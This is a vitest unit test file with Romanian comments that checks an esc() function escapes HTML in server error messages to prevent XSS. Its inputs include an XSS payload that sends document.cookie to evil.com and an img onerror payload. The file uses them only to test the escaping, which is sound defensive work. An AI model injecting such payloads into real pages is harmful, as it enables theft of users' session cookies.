import { describe, it, expect } from 'vitest';
import { esc } from './ui.js';

// Test 6
// Nume: esc() - cazuri limita si securitate
// Ce verifica: cazuri limita ale functiei esc() care protejeaza
//              impotriva XSS in mesajele de eroare si in orice alt
//              loc unde se insereaza date din backend in DOM
// De ce: showError() insereaza mesajul direct in innerHTML —
//        daca mesajul vine de la server si contine HTML, trebuie
//        escapeat inainte de inserare. Testam aici cazurile limita
//        care pot aparea in mesaje de eroare reale
// Tip: unit test pur, nu necesita browser sau backend
describe('esc() - cazuri limita pentru mesaje de eroare', () => {

    it('escapeaza un mesaj de eroare cu tag HTML', () => {
        const msg = '<b>service unavailable</b>';
        expect(esc(msg)).toBe('&lt;b&gt;service unavailable&lt;/b&gt;');
    });

    it('escapeaza un mesaj cu script injection', () => {
        const msg = '<script>fetch("https://evil.com?c="+document.cookie)</script>';
        expect(esc(msg)).not.toContain('<script>');
        expect(esc(msg)).not.toContain('</script>');
    });

    it('escapeaza mesaj cu multiple caractere speciale', () => {
        const msg = '<img src=x onerror="alert(1)">';
        expect(esc(msg)).not.toContain('<img');
        expect(esc(msg)).toContain('&lt;img');
    });

    it('pastreaza mesaje de eroare normale neschimbate', () => {
        expect(esc('database connection failed')).toBe('database connection failed');
        expect(esc('too many requests')).toBe('too many requests');
        expect(esc('query too long')).toBe('query too long');
    });

    it('gestioneaza corect un mesaj gol', () => {
        expect(esc('')).toBe('');
    });

});
